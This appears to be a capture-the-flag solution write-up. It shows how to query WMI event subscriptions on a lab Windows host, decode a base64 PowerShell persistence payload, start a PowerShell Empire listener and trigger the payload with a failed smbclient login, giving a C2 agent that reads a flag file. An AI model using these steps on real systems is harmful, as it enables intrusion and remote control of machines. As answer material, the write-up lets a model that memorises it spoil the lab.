# Lost WMI Footing Solution

 1. On the Desktop of the Kali machine there's a python program that allows you to query WMI objects from the Windows machine using the creds given
 ```powershell
	- ~/Desktop/wmiquery.py -namespace //./root/subscription User:scotty@@1@10.5.5.60
	- SELECT * FROM __EventFilter
	- SELECT * FROM __EventConsumer
	- __EventFilter contains the name needed to trigger the failed login
	- __EventConsumer contains the subscription name and the encoded powershell script that runs on failed login trigger
```
2. Decode the base64 string and then find the encoded URL string and decode that in order to get the port number for the listener
3. Power on powershell-empire and create a http listener on the port found in the decoded URL string
4. Use the fake login name and trigger a failed login attempt
```powershell
	- smbclient \\\\10.5.5.60\\C$ -U (LoginName) (any password)
```
- Once triggered, you will have an agent in powershell-empire
5. Change directories to C:\Users\User\Desktop and get the contents of token.txt
```powershell
	- agents
	- interact (agent name)
	- cd C:\Users\User\Desktop
	- cat token.txt
```

The needed info to answer the questions:
- port number
- login name
- subscription name
- flag from User (Windows machine) desktop